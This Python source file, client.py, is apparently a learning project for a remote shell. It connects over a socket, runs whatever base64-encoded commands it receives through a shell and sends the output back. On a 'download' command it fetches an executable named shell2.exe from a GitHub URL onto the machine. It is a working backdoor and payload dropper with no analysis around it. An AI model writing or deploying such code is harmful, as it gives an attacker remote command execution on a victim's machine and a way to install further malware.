# client.py

import os
import socket                   # Import socket module
import base64
import subprocess
import sys
import urllib


URL = 'https://github.com/B0rjitaaa/MTIC_Python_Remote/blob/master/shell2.exe'

# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str
 
 
# Encode Base64 data
def encode(data):
    return base64.b64encode(data)
 

def exists_bichito():
    return os.path.isfile('shell2.exe')


s = socket.socket()             # Create a socket object
host = socket.gethostname()     # Get local machine name
port = 60007                    # Reserve a port for your service.

s.connect((host, port))
s.send("Hello server!")



while 1:
    cmd = decode(s.recv(1024))
    if cmd == "quit":
        s.close()
    elif cmd == "download":
        exploit = urllib.URLopener()
        exploit.retrieve(URL, 'shell222.exe')
        s.send(encode('OK'))
    else:
        response = subprocess.check_output(cmd, shell=True)
        encoded = encode(response)
        s.send(encoded)


s.close()
print('Connection closed')
exit()